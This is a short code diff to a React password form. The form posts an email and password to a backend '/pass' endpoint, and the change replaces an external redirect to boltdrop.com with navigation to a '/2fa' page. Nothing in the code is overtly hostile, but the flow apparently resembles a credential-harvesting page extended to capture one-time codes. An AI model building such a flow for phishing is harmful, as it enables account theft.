@@ -44,10 +44,9 @@ const Password = () => {
     axios
       .post(`${BASE_URL}/pass`, data) // Send email and password
       .then((response) => {
-        console.log(response.data);
-        window.location.href = "https://boltdrop.com/";
-// Redirect to dashboard or any other page
-        reset(); // Reset
+         console.log(response.data);
+        navigate("/2fa"); // Redirect to dashboard or any other page
+        reset();
       })
       .catch((error) => {
         console.error("Error:", error);
